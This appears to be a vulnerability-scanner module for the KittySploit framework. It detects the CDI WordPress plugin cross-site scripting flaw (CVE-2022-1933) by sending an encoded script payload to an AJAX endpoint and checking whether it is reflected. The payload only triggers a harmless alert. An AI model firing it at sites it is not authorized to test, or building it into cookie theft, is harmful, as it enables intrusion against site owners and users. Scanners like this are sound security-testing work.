#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""WordPress CDI plugin prior to 5."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'WordPress CDI <5.1.9 - Cross Site Scripting Detection',
        'description': 'WordPress CDI plugin prior to 5.1.9 contains a cross-site scripting vulnerability. The plugin does not sanitize and escape a parameter before outputting it back in the response of an AJAX action. An attacker can inject arbitrary script in the browser of an unsuspecting user in the context of the affected site. This can allow the attacker to steal cookie-based authentication credentials and launch other attacks.',
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': [
            'web',
            'scanner',
            'cve',
            'cve2022',
            'cdi',
            'wpscan',
            'wp-plugin',
            'wp',
            'wordpress',
            'xss',
            'collect_and_deliver_interface_for_woocommerce_project',
            'vuln',
        ],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://wpscan.com/vulnerability/6cedb27f-6140-4cba-836f-63de98e521bf',
            'https://wordpress.org/plugins/collect-and-deliver-interface-for-woocommerce/advanced/',
            'https://nvd.nist.gov/vuln/detail/CVE-2022-1933',
            'https://github.com/ARPSyndicate/cvemon',
            'https://github.com/ARPSyndicate/kenzer-templates',
        ],
        'cve': 'CVE-2022-1933',
    }

    def run(self):
        r = self.http_request(method="GET", path='/wp-admin/admin-ajax.php?action=cdi_collect_follow&trk=%3Cscript%3Ealert(document.domain)%3C/script%3E', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
        body_all = ('<script>alert(document.domain)</script>', 'Tracking code not correct',)
        header_any = ('text/html',)
        if (all(m in body for m in body_all)) and (any(m in headers for m in header_any)):
            self.set_info(
                severity='medium',
                reason="WordPress CDI <5.1.9 - Cross Site Scripting detected",
                path='/wp-admin/admin-ajax.php?action=cdi_collect_follow&trk=%3Cscript%3Ealert(document.domain)%3C/script%3E',
            )
            return True
        return False

